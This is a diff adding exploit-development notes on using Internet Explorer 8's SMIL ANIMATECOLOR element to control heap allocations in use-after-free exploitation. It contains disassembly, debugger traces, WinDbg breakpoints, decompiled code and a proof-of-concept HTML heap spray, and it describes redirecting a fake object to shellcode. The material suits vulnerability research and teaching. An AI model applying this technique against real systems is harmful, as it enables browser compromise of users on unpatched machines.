@@ -1,0 +1,368 @@
+Using Synchronized Multimedia Integration Language (SMIL) for Heap Control
+
+===================================================================================================
+Supported platform:
+* Windows + Internet Explorer 8
+
+===================================================================================================
+Reference:
+http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/
+https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ie_cbutton_uaf.rb
+http://msdn.microsoft.com/en-us/library/ms533592(v=vs.85).aspx
+
+===================================================================================================
+Analysis:
+
+Synchronized Multimedia Integration Language (SMIL) is an XML markup language to describe multimedia
+presentations.  It defines markup for timing, layout, animations, visual transitions, and media
+embedding, etc.  This feature is supported by Internet Explorer 8, but no longer the case for newer
+IEs.  The animateColor element of SMIL can be used to create arbitrary sized arrays containing
+pointers to strings that we control.  In an exploitation scenario, you can take advantage of this
+behavior in a use-after-free vulnerability.
+
+The following example is how you create an ANIMATECOLOR element:
+
+	<t:ANIMATECOLOR id="anim"/>
+
+When you assign something to the values property, that's where you trigger the allocation that you
+control.  Here's an example of how to do that:
+
+	e = document.getElementById("anim");
+	e.values = "cyan;cyan;cyan";
+
+The function responsible for this is "CTIMEAnimationBase::put_values" found in mstime.dll.  And
+here's the callstack for that:
+
+	020bc158 00e713d7 ntdll!RtlAllocateHeap+0x80
+	020bc16c 00e9ba34 mstime!operator new+0x16
+	020bc1c4 00e9edd5 mstime!CTIMEAnimationBase::put_values+0x216
+	020bc214 77135cd9 mstime!CTIMEColorAnimation::put_values+0x51
+	020bc23c 771362e8 OLEAUT32!DispCallFunc+0x16a
+	020bc2cc 771361a0 OLEAUT32!CTypeInfo2::Invoke+0x234
+	020bc35c 00e82754 OLEAUT32!CTypeInfo2::Invoke+0x60a
+	020bc38c 00e848d4 mstime!CTIMEComTypeInfoHolder::Invoke+0x40
+	020bc3b4 6362c51d mstime!ITIMEDispatchImpl<ITIMEAnimationElement2,&IID_ITIMEAnimationElement2,0,CTIMEComTypeInfoHolder>::Invoke+0x24
+	020bc3f0 6362c416 mshtml!InvokeDispatchWithNoThis+0x74
+	020bc42c 6362c35a mshtml!CPeerHolder::InvokeExSingle+0xe4
+	020bc498 6362c2c3 mshtml!CPeerHolder::InvokeExMulti+0x134
+	020bc4dc 6362b6ce mshtml!CElement::ContextInvokeEx+0x64
+	020bc508 63642eec mshtml!CInput::VersionedInvokeEx+0x2d
+	020bc558 633a6d37 mshtml!PlainInvokeEx+0xea
+	020bc598 633a6c75 jscript!IDispatchExInvokeEx2+0xf8
+	020bc5d4 633a9cfe jscript!IDispatchExInvokeEx+0x6a
+	020bc694 633a9f3c jscript!InvokeDispatchEx+0x98
+	020bc6c8 633a77ff jscript!VAR::InvokeByName+0x135
+	020bc710 633a75bf jscript!VAR::InvokeDispName+0x7a
+
+
+To explain CTIMEAnimationBase::put_values more, first off, it will do a malloc() to create a buffer
+that will be used to store our pointers.  Each pointer is 4 bytes, so if you want 0x58 bytes, you
+want 0x58/4 = 0x16 elements (or 22 in decimal):
+
+	.text:0042BA20    push    4
+	.text:0042BA22    xor     ecx, ecx
+	.text:0042BA24    pop     edx
+	.text:0042BA25    mul     edx
+	.text:0042BA27    seto    cl
+	.text:0042BA2A    neg     ecx
+	.text:0042BA2C    or      eax, ecx
+	.text:0042BA2E    push    eax             ; dwBytes
+	.text:0042BA2F    call    ?ATL_malloc@@YAPAXI@Z
+
+While it iterates through each ANIMATECOLOR element, another malloc() is triggered in order to store
+each value (so every "cyan" has its own buffer):
+
+	.text:0042BA67    mov     esi, [esp+48h+var_34]
+	.text:0042BA6B    mov     eax, [esp+48h+var_14]
+	.text:0042BA6F    shl     esi, 2
+	.text:0042BA72    mov     eax, [esi+eax]
+	.text:0042BA75    mov     ebx, [eax+4]
+	.text:0042BA78    mov     eax, [eax]
+	.text:0042BA7A    mov     [esp+48h+var_28], eax
+	.text:0042BA7E    xor     ecx, ecx
+	.text:0042BA80    push    2
+	.text:0042BA82    lea     eax, [ebx+1]
+	.text:0042BA85    pop     edx
+	.text:0042BA86    mov     [esp+48h+var_24], eax
+	.text:0042BA8A    mul     edx
+	.text:0042BA8C    seto    cl
+	.text:0042BA8F    neg     ecx
+	.text:0042BA91    or      ecx, eax
+	.text:0042BA93    push    ecx             ; dwBytes
+	.text:0042BA94    call    ?ATL_malloc@@YAPAXI@Z ; Allocate buffer for the buffer for the pointer
+
+After a buffer is created for the value, a copying routine called StringCchCopyNW() will place a
+pointer to the buffer, and then map the value to that pointer:
+
+	.text:0042BAB4    mov     eax, [eax]
+	.text:0042BAB6    and     word ptr [eax+ebx*2], 0
+	.text:0042BABB    mov     ecx, [esp+48h+var_28]
+	.text:0042BABF    mov     eax, [esp+48h+var_2C]
+	.text:0042BAC3    lea     eax, [eax+ecx*2]
+	.text:0042BAC6    push    ebx             ; unsigned __int16 *
+	.text:0042BAC7    push    eax             ; unsigned int
+	.text:0042BAC8    mov     eax, [edi+1F4h]
+	.text:0042BACE    push    [esp+50h+var_24] ; unsigned __int16 *
+	.text:0042BAD2    mov     ecx, [esi+eax]
+	.text:0042BAD5    call    ?StringCchCopyNW@@YGJPAGIPBGI@Z ; Copy property
+
+This is what the buffer looks like with an array of pointers:
+
+	0:009> dda 00214db0 L16
+	00214db0  00194c18 "c"
+	00214db4  032f4670 "c"
+	00214db8  032f46a0 "c"
+	00214dbc  032f45f8 "c"
+	00214dc0  032f4478 "c"
+	00214dc4  032f45e0 "c"
+	00214dc8  032f4538 "c"
+	00214dcc  032f4730 "c"
+	00214dd0  02924ff0 "c"
+	00214dd4  02924ed0 "c"
+	00214dd8  02924f18 "c"
+	00214ddc  02925008 "c"
+	00214de0  02924e58 "c"
+	00214de4  02924eb8 "c"
+	00214de8  02924e40 "c"
+	00214dec  02924fa8 "c"
+	00214df0  02924fd8 "c"
+	00214df4  02924f78 "c"
+	00214df8  02924f60 "c"
+	00214dfc  02924f90 "c"
+	00214e00  02924f48 "c"
+	00214e04  02925020 "c"
+
+"c" means that buffer contains the word "cyan".  But of course, you can place the word "cyan" with
+whatever you want -- say, your payload:
+
+	0:009> dda 00214db0 L4
+	00214db0  00194c18 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+	00214db4  032f4670 "c"
+	00214db8  032f46a0 "c"
+	00214dbc  032f45f8 "c"
+
+The above example is good for a crash like:
+
+	MOV  EAX, [EDI]  ; EDI is your fake object
+	CALL [EAX+0C]    ; this points to your shellcode
+
+
+Additional notes:
+
+In order to enable HTML+TIME, you must have this at the beginning of your HTML file:
+
+	<!doctype html>
+	<HTML XMLNS:t ="urn:schemas-microsoft-com:time">
+
+Also, you need this in <meta>
+
+	<meta>
+		<?IMPORT namespace="t" implementation="#default#time2">
+	</meta>
+
+According to MSDN, time2 is needed because it uses the following model to eval which properties
+to animate:
+* The values property, if specified, overrides any setting for the from, to, or by properties.
+* The from property is used unless the values or path properties are specified.
+* The to property, if specified, overrides any setting for the by property.
+* The by property doesn't override any properties.
+
+===================================================================================================
+Breakpoints (For Windows XP SP3):
+
+bu mstime!CTIMEAnimationBase::put_values+0x216 "r $t0 = eax; r $t1 = 1; .printf \"[*] Allocating for pointers: 0x%08x\",eax; .echo ; g"
+bu mstime!CTIMEAnimationBase::put_values+0x27b ".printf \"[*] Allocating for animatecolor element: 0x%08x\",eax; .echo ; g"
+bu mstime!CTIMEAnimationBase::put_values+0x2bc ".echo \"[*] Initializing animatecolor element. Here's a dump:\"; dd @$t0; .echo; g"
+
+===================================================================================================
+PoC:
+
+	<!doctype html>
+	<HTML XMLNS:t ="urn:schemas-microsoft-com:time">
+
+	<head>
+	<meta>
+		<?IMPORT namespace="t" implementation="#default#time2">
+	</meta>
+	<script>
+		function sprayMe() {
+			animvalues = "\u4141\u4141";
+			while(animvalues.length < 0xDC) {
+				animvalues += animvalues;
+			}
+			for(i = 0; i < 21; i++) {
+				animvalues += ";cyan";
+			}
+
+			Math.atan2(0xbabe, "start");
+			try {
+				a = document.getElementById('myanim');
+				a.values = animvalues;
+				Math.atan2(0xbabe, "stop");
+			}
+			catch(e) {}
+		}
+
+	</script>
+	</head>
+	<body onload="sprayMe()">
+		<t:ANIMATECOLOR id="myanim"/>
+	</body>
+	</html>
+
+===================================================================================================
+Decompiled code for CTIMEAnimationBase::put_values:
+
+	HRESULT __stdcall CTIMEAnimationBase::put_values(int a1, VARIANTARG pvargSrc)
+	{
+	  void *v2; // ST10_4@1
+	  int v3; // ebx@1
+	  bool v4; // zf@5
+	  unsigned __int16 *v5; // eax@10
+	  unsigned __int16 *v6; // ebx@10
+	  int v7; // esi@13
+	  HRESULT v9; // eax@17
+	  bool v10; // sf@17
+	  int v11; // eax@17
+	  HRESULT v12; // esi@18
+	  void *v13; // eax@20
+	  int v14; // eax@22
+	  int v15; // ebx@22
+	  int v16; // eax@22
+	  const unsigned __int16 *v17; // [sp+0h] [bp-48h]@0
+	  unsigned int v18; // [sp+0h] [bp-48h]@10
+	  char v19; // [sp+13h] [bp-35h]@1
+	  int i; // [sp+14h] [bp-34h]@2
+	  HRESULT v21; // [sp+14h] [bp-34h]@8
+	  int v22; // [sp+14h] [bp-34h]@21
+	  signed int v23; // [sp+18h] [bp-30h]@1
+	  unsigned __int16 *v24; // [sp+1Ch] [bp-2Ch]@10
+	  int v25; // [sp+20h] [bp-28h]@22
+	  int (__thiscall **v26)(LPVOID, char); // [sp+28h] [bp-20h]@1
+	  char v27; // [sp+2Ch] [bp-1Ch]@1
+	  char v28; // [sp+2Dh] [bp-1Bh]@1
+	  int v29; // [sp+30h] [bp-18h]@1
+	  int v30; // [sp+34h] [bp-14h]@1
+	  VARIANTARG pvarg; // [sp+38h] [bp-10h]@1
+
+	  VariantInit(&pvarg);
+	  v2 = *(void **)(a1 + 80);
+	  v3 = 0;
+	  v27 = 0;
+	  v28 = 0;
+	  v29 = 0;
+	  v30 = 0;
+	  v26 = &CPtrAry<MMBaseBvr__>::_vftable_;
+	  v19 = 1;
+	  v23 = 5;
+	  operator delete(v2);
+	  CAttr<unsigned_short__>::Reset(0);
+	  if ( *(_DWORD *)(a1 + 500) )
+	  {
+	    for ( i = 0; i < *(_DWORD *)(a1 + 496); ++i )
+	      operator delete(*(LPVOID *)(*(_DWORD *)(a1 + 500) + 4 * i));
+	    operator delete(*(LPVOID *)(a1 + 500));
+	    *(_DWORD *)(a1 + 500) = 0;
+	  }
+	  v4 = pvargSrc.vt == 0;
+	  *(_DWORD *)(a1 + 496) = 0;
+	  if ( v4 || pvargSrc.vt == 1 || pvargSrc.vt == 9 )
+	  {
+	    v21 = 0;
+	    goto LABEL_16;
+	  }
+	  v21 = VariantCopy(&pvarg, &pvargSrc);
+	  if ( v21 < 0 )
+	    goto LABEL_13;
+	  v21 = VariantChangeTypeEx(&pvarg, &pvarg, 0x409u, 4u, 8u);
+	  if ( v21 < 0 )
+	    goto LABEL_13;
+	  v5 = CopyString(v17);
+	  v6 = v5;
+	  v24 = v5;
+	  if ( !v5 )
+	    goto LABEL_11;
+	  *(_DWORD *)(a1 + 80) = v5;
+	  CAttrBase::ClearString();
+	  *(_BYTE *)(a1 + 76) = 1;
+	  v9 = StringToTokens(v6, L";", &v26);
+	  v21 = v9;
+	  v10 = v9 < 0;
+	  v11 = v29;
+	  *(_DWORD *)(a1 + 496) = v29;
+	  if ( v10 )
+	    goto LABEL_12;
+	  v12 = 0;
+	  if ( !v11 )
+	  {
+	LABEL_19:
+	    v21 = v12;
+	    goto LABEL_16;
+	  }
+	  v13 = (void *)ATL_malloc(-((unsigned __int64)(unsigned int)v11 >> 30 != 0) | 4 * v11);
+	  *(_DWORD *)(a1 + 500) = v13;
+	  if ( v13 )
+	  {
+	    memset(v13, 0, 4 * *(_DWORD *)(a1 + 496));
+	    v22 = 0;
+	    if ( *(_DWORD *)(a1 + 496) <= 0 )
+	    {
+	LABEL_30:
+	      v23 = 1;
+	      goto LABEL_19;
+	    }
+	    while ( 1 )
+	    {
+	      v14 = *(_DWORD *)(4 * v22 + v30);
+	      v15 = *(_DWORD *)(v14 + 4);
+	      v25 = *(_DWORD *)v14;
+	      *(_DWORD *)(4 * v22 + *(_DWORD *)(a1 + 500)) = ATL_malloc(2 * (v15 + 1) | -((unsigned __int64)(unsigned int)(v15 + 1) >> 31 != 0));
+	      v16 = 4 * v22 + *(_DWORD *)(a1 + 500);
+	      if ( !*(_DWORD *)v16 )
+	        break;
+	      *(_WORD *)(*(_DWORD *)v16 + 2 * v15) = 0;
+	      StringCchCopyNW((unsigned __int16 *)(v15 + 1), (unsigned int)&v24[v25], (const unsigned __int16 *)v15, v18);
+	      if ( v19 )
+	      {
+	        ATL::CComVariant::operator_(*(OLECHAR **)(4 * v22 + *(_DWORD *)(a1 + 500)));
+	        if ( pvarg.lVal )
+	        {
+	          if ( !(unsigned __int8)(*(int (__stdcall **)(VARIANTARG *))(*(_DWORD *)(a1 - 680) + 252))(&pvarg) )
+	            v19 = 0;
+	          VariantClear(&pvarg);
+	        }
+	      }
+	      ++v22;
+	      if ( v22 >= *(_DWORD *)(a1 + 496) )
+	      {
+	        v12 = 0;
+	        goto LABEL_30;
+	      }
+	    }
+	  }
+	LABEL_11:
+	  v21 = -2147024882;
+	LABEL_12:
+	  v3 = 0;
+	LABEL_13:
+	  v7 = 0;
+	  if ( *(_DWORD *)(a1 + 496) > v3 )
+	  {
+	    do
+	      operator delete(*(LPVOID *)(*(_DWORD *)(a1 + 500) + 4 * v7++));
+	    while ( v7 < *(_DWORD *)(a1 + 496) );
+	  }
+	  operator delete(*(LPVOID *)(a1 + 500));
+	  *(_DWORD *)(a1 + 500) = v3;
+	LABEL_16:
+	  CTIMEAnimationBase::updateDataToUse(v23);
+	  *(_BYTE *)(a1 + 531) = v19;
+	  (*(void (__thiscall **)(int))(*(_DWORD *)(a1 - 680) + 288))(a1 - 680);
+	  (*(void (__thiscall **)(int))(*(_DWORD *)(a1 - 680) + 376))(a1 - 680);
+	  (*(void (__thiscall **)(int))(*(_DWORD *)(a1 - 680) + 368))(a1 - 680);
+	  FreeStringTokenArray();
+	  CTIMEAnimationBase::NotifyPropertyChanged(777);
+	  CImplAry::_CImplAry(&v26);
+	  VariantClear(&pvarg);
+	  return v21;
+	}
